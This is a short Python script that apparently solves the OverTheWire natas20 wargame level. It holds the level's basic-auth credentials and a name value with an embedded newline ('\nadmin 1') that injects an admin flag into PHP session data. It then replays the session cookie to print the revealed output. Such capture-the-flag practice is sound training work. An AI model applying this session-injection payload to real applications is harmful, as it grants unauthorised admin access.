#! /usr/bin/python3
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

url = "http://natas20.natas.labs.overthewire.org/index.php?debug=true"
auth = HTTPBasicAuth("natas20","eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF")
data = {"name":"\nadmin 1"}

response = requests.post(url,auth=auth,data=data)
cookie = response.headers['Set-Cookie'].split("=")[1].split(";")[0]
cookies = {'PHPSESSID':cookie}
second_response = requests.get(url,auth=auth,cookies=cookies)
soup = BeautifulSoup(second_response.text,"html.parser")
print(str(soup.find('pre')).replace("<pre>","").replace("</pre>",""))
